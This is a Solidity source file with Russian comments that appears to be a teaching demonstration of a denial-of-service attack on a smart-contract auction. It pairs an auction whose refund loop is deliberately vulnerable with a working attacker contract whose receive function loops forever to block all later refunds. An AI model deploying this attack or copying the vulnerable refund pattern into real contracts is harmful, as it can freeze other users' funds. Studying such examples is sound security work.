// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.8.0;

contract DosAuction {
    mapping(address => uint) public bidders;
    address[] public allBidders;
    uint public refundProgress;

    function bid() external payable {
        // require(msg.sender.code.length == 0, "no contracts"); возможная защита (не 100%) запрещающая ставки со смарт-контрактов
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }
    
    function refund() external {
        for(uint i = refundProgress; i < allBidders.length; i++) {
            address bidder = allBidders[i];

            (bool success,) = bidder.call{value: bidders[bidder]}("");
            require(success, "failed!");

            refundProgress++;
        }
    }
}

contract DosAttack {
    DosAuction auction;
    bool hack = true;
    address payable owner;

    constructor(address _auction) {
        auction = DosAuction(_auction);
        owner = payable(msg.sender);
    }

    function doBid() external payable {
        auction.bid{value: msg.value}();
    }

    function toggleHack() external {               // если на момент вызова функции receive() злоумышленника флаг hack установлен в true, его
                                                   // контракт попадёт в бесконечный цикл, что приведёт к остановке выполнения всей функции
                                                   // refund() для всех последующих участников. если же флаг переключен на false, вызов receive()
                                                   // завершится успешно, и эфир, отправленный аукционным контрактом, будет передан владельцу
                                                   // злоумышленника через owner.transfer(msg.value). при этом дальнейший цикл продолжится, 
                                                   // и остальные участники получат свои средства. 
        require(msg.sender == owner, "failed");

        hack = !hack;
    }

    receive() external payable {
        if(hack == true) {                         // переменная hack управляет поведением функции: при значении true контракт намеренно ведёт
                                                   // себя таким образом, чтобы блокировать дальнейшие вычисления.
            while(true) {}
        } else {
            owner.transfer(msg.value);             // функция transfer отправляет весь полученный эфир (msg.value) на адрес, хранящийся в 
                                                   // переменной owner. эта операция гарантирует, что эфир не будет задержан внутри контракта,
                                                   // а будет автоматически передан владельцу контракта.
        }
    }                                              // при активном флаге hack выполнение функции заходит в бесконечный цикл. но в рамках
                                                   // транзакции есть ограничение по газу, и, когда лимит газа исчерпывается, вызов call не
                                                   // возвращает true, а возвращает false. Именно это приводит к тому, что
                                                   // require(success, "failed!") срабатывает, откатывая всю транзакцию.
}